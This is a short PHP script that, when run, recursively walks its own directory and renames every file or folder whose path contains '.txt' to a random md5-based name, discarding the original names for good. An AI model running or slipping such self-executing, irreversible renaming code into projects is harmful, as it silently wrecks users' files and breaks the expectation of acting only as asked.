<?php

function getFiles($path) {
    $target = ".txt";
    $result = array();
    foreach(glob($path . "/*") as $file) {
        if(strpos($file, $target) !== false) {
            $befor = str_replace(basename($file), md5(uniqid(rand(),1)).$target, $file);
            rename($file, $befor);
            $file = $befor;
        }

        if(is_dir($file)) {
            $result = array_merge($result, getFiles($file));
        }

        $result[] = basename($file);
    }

    return $result;
}

$path = __DIR__;
getFiles($path);
